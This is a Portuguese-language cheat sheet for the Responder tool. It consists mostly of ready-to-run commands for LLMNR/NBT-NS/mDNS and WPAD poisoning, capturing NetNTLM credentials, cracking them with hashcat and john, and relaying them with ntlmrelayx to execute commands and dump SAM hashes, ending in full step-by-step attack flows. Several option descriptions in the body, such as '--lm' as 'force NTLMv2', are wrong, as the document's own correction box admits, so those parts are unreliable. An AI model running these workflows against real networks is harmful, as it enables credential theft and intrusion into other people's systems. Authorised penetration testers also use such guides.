# 🎣 Responder — falsificação de respostas LLMNR/NBT-NS

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

> **Correções de precisão:** o material NetNTLM capturado é uma resposta a um desafio de autenticação, não o hash NT da palavra-passe, e não pode ser usado diretamente como esse hash em Pass-the-Hash. Pode servir para testar palavras-passe ou para um relay quando as condições o permitirem. `--lm` força uma descida para LM; não força NTLMv2. `-d` ativa envenenamento DHCPv4, não é simplesmente uma opção de servidor DNS. As descrições originais dessas opções foram preservadas e precisam desta ressalva. [Definições oficiais das opções](https://github.com/lgandx/Responder/blob/master/Responder.py). LLMNR/NBT-NS/mDNS são mecanismos de resolução de nomes; relay reencaminha uma autenticação para outro serviço.

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗ ███████╗███████╗██████╗  ██████╗ ███╗   ██╗██████╗ ███████╗██████╗ 
  ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗████╗  ██║██╔══██╗██╔════╝██╔══██╗
  ██████╔╝█████╗  ███████╗██████╔╝██║   ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
  ██╔══██╗██╔══╝  ╚════██║██╔═══╝ ██║   ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
  ██║  ██║███████╗███████║██║     ╚██████╔╝██║ ╚████║██████╔╝███████╗██║  ██║
  ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝
               Falsificação de respostas LLMNR/NBT-NS/mDNS
```

<p align="center">
  <img src="https://img.shields.io/badge/Responder-NTLM_Capture-red?style=for-the-badge" alt="Responder">
  <img src="https://img.shields.io/badge/LLMNR-Poisoning-blue?style=for-the-badge" alt="LLMNR">
</p>

---

## 📋 Índice

- [O que é o Responder](#-what-is-responder)
- [Instalação](#-installation)
- [Utilização básica](#-basic-usage)
- [Capturar respostas NTLMv2](#-capture-ntlmv2-hashes)
- [Ataques de reencaminhamento de autenticação (relay)](#-relay-attacks)
- [Servidores fraudulentos](#-rogue-servers)
- [Configuração](#-configuration)
- [Referência rápida](#-quick-reference)

---

<a id="-what-is-responder"></a>
## 🎯 O que é o Responder

O **Responder** falsifica respostas LLMNR, NBT-NS e mDNS para capturar material de autenticação NTLM:

- 🎣 **Falsificação de LLMNR** — Resolução de nomes multicast na ligação local
- 📡 **Falsificação de NBT-NS** — Serviço de nomes NetBIOS
- 🍎 **Falsificação de mDNS** — DNS multicast
- 🔓 **Captura de hashes** — Material NTLMv1/NTLMv2
- 🔄 **Suporte de relay** — Ataques de reencaminhamento de autenticação NTLM

### Como funciona

```
1. O utilizador escreve um nome de sistema errado: \\fileservr (erro de digitação)
2. O DNS não consegue resolver o nome
3. O Windows difunde uma consulta LLMNR/NBT-NS
4. O Responder responde: «Sou o fileservr!»
5. A vítima envia material NTLM para se autenticar
6. O material é capturado para tentar descobrir a palavra-passe ou reencaminhar a autenticação
```

---

<a id="-installation"></a>
## 🚀 Instalação

### Kali Linux

```bash
# Pré-instalado
responder --help

# Atualizar
sudo apt update && sudo apt install responder

# Ou a partir de GitHub
git clone https://github.com/lgandx/Responder.git
cd Responder
python Responder.py --help
```

### Verificar

```bash
responder --help
responder -I eth0 --version
```

---

<a id="-basic-usage"></a>
## 💻 Utilização básica

### Iniciar Responder

```bash
# Utilização básica (captura de material de autenticação)
sudo responder -I eth0

# Detalhado
sudo responder -I eth0 -v

# Modo de análise (passivo)
sudo responder -I eth0 -A
```

### Seleção da interface

```bash
# Ethernet
sudo responder -I eth0

# Rede sem fios
sudo responder -I wlan0

# Listar interfaces
ip a
```

---

<a id="-capture-ntlmv2-hashes"></a>
## 🔓 Capturar respostas NTLMv2

### Captura básica

```bash
# Iniciar Responder
sudo responder -I eth0

# Aguardar por sistemas que iniciem autenticação...
# Saída:
[+] Listening for events...
[HTTP] NTLMv2 Client   : 192.168.1.100
[HTTP] NTLMv2 Username : DOMAIN\user
[HTTP] NTLMv2 Hash     : user::DOMAIN:1122334455667788:...
```

### Forçar NTLMv2

```bash
# Apenas NTLMv2 (recomendado para descobrir palavras-passe)
sudo responder -I eth0 --lm
```

### Captura através de WPAD

```bash
# Ativar o proxy WPAD
sudo responder -I eth0 -w

# Forçar autenticação WPAD
sudo responder -I eth0 -wF
```

### Locais dos hashes

```bash
# Material capturado guardado em:
/usr/share/responder/logs/
# Or
./logs/

# Ficheiros:
Responder-Session.log
SMB-NTLMv2-*.txt
HTTP-NTLMv2-*.txt
```

### Descobrir palavras-passe a partir dos hashes capturados

```bash
# Formato NTLMv2:
# user::DOMAIN:ServerChallenge:NTProofStr:NTLMv2Response

# Hashcat (modo 5600)
hashcat -m 5600 hash.txt wordlist.txt

# John
john --format=netntlmv2 hash.txt
```

---

<a id="-relay-attacks"></a>
## 🔄 Ataques de reencaminhamento de autenticação (relay)

### Desativar SMB/HTTP (para relay)

```bash
# Editar Responder.conf
sudo nano /usr/share/responder/Responder.conf

# Definir:
SMB = Off
HTTP = Off
```

### Responder + ntlmrelayx

```bash
# Terminal 1: Responder (sem SMB/HTTP)
sudo responder -I eth0

# Terminal 2: ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support

# Ou com execução de comandos
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

### Reencaminhamento para LDAP

```bash
# Responder
sudo responder -I eth0

# Reencaminhamento para LDAP
impacket-ntlmrelayx -t ldap://DC01.domain.local
```

### Reencaminhamento para extrair SAM

```bash
# Extrair SAM após o reencaminhamento
impacket-ntlmrelayx -tf targets.txt -smb2support --sam
```

---

<a id="-rogue-servers"></a>
## 🖥️ Servidores fraudulentos

### Servidores integrados

| Servidor | Porta | Finalidade |
|--------|------|---------|
| SMB | 445 | Autenticação de partilhas de ficheiros |
| HTTP | 80 | Autenticação Web |
| HTTPS | 443 | Web segura |
| FTP | 21 | Autenticação FTP |
| SQL | 1433 | Autenticação MSSQL |
| LDAP | 389 | Autenticação do diretório |
| WPAD | 80 | Configuração de proxy |

### Ativar ou desativar servidores

```bash
# Editar Responder.conf
[Responder Core]
; Servidores a iniciar
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
```

### Proxy WPAD fraudulento

```bash
# Ativar WPAD
sudo responder -I eth0 -w

# Forçar autenticação Basic em WPAD
sudo responder -I eth0 -wF

# Script WPAD personalizado
sudo responder -I eth0 -w --wpad-name wpad.dat
```

### Falsificação de DNS

```bash
# Ativar DNS
sudo responder -I eth0 -d

# O Responder passa a atuar como servidor DNS
# Responde a consultas para todos os sistemas
```

---

<a id="-configuration"></a>
## ⚙️ Configuração

### Responder.conf

```bash
# Localização
/usr/share/responder/Responder.conf
# Or
./Responder.conf
```

### Definições principais

```ini
[Responder Core]
; Definir como On ou Off
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On

; Desafio personalizado (para tabelas pré-calculadas)
Challenge = Random

; Não responder a consultas locais
DontRespondTo =

; Responder apenas a estes endereços IP
RespondTo =
```

### Desafio estático (tabelas pré-calculadas)

```ini
; Definir um desafio estático para tabelas pré-calculadas
Challenge = 1122334455667788
```

### Exclusões

```ini
; Não responder a estes endereços IP
DontRespondTo = 192.168.1.1, 192.168.1.2

; Responder apenas a estes
RespondTo = 192.168.1.100, 192.168.1.101
```

---

<a id="-quick-reference"></a>
## 📊 Referência rápida

### Comandos essenciais

| Comando | Descrição |
|---------|-------------|
| `responder -I eth0` | Captura básica |
| `responder -I eth0 -v` | Modo detalhado |
| `responder -I eth0 -A` | Apenas análise |
| `responder -I eth0 -w` | Ativar WPAD |
| `responder -I eth0 -wF` | Forçar autenticação WPAD |
| `responder -I eth0 -d` | Ativar DNS |

### Opções

| Opção | Descrição |
|------|-------------|
| `-I` | Interface |
| `-v` | Detalhado |
| `-A` | Modo de análise (passivo) |
| `-w` | Ativar WPAD |
| `-wF` | Forçar autenticação WPAD |
| `-d` | Ativar DNS |
| `-f` | Identificar características dos sistemas |
| `-b` | Solicitar autenticação Basic |

### Tipos de hashes

| Tipo | Modo do Hashcat | Formato do John |
|------|--------------|-------------|
| NTLMv1 | 5500 | netntlm |
| NTLMv2 | 5600 | netntlmv2 |

### Fluxo de ataque

```bash
# 1. Iniciar Responder
sudo responder -I eth0 -wFv

# 2. Aguardar pela captura de material de autenticação
# Material capturado guardado em ./logs/

# 3. Descobrir palavras-passe a partir dos hashes
hashcat -m 5600 ./logs/*NTLM*.txt rockyou.txt

# 4. Ou reencaminhar a autenticação (desativar primeiro SMB)
sudo responder -I eth0  # SMB=Off na configuração
impacket-ntlmrelayx -tf targets.txt -smb2support
```

### Fluxo de reencaminhamento de autenticação

```bash
# 1. Encontrar alvos sem assinatura SMB
cme smb 10.10.10.0/24 --gen-relay-list relay.txt

# 2. Configurar Responder.conf
# SMB = Off
# HTTP = Off

# 3. Iniciar Responder
sudo responder -I eth0

# 4. Iniciar o reencaminhamento de autenticação
impacket-ntlmrelayx -tf relay.txt -smb2support

# 5. Aguardar pela autenticação reencaminhada
```

---

## 📚 Recursos

- [Responder GitHub](https://github.com/lgandx/Responder)
- [LLMNR Poisoning](https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/)
- [ntlmrelayx](https://github.com/fortra/impacket)

### Guias de referência relacionados
- [Impacket](../../Impacket/translations/README.pt.md)
- [CrackMapExec](../../CrackMapExec/translations/README.pt.md)
- [Hashcat](../../Hashcat/translations/README.pt.md)

---

<p align="center">
  <b>🎣 Capture material de autenticação!</b><br>
  <i>Responder — recolha de credenciais na rede</i>
</p>
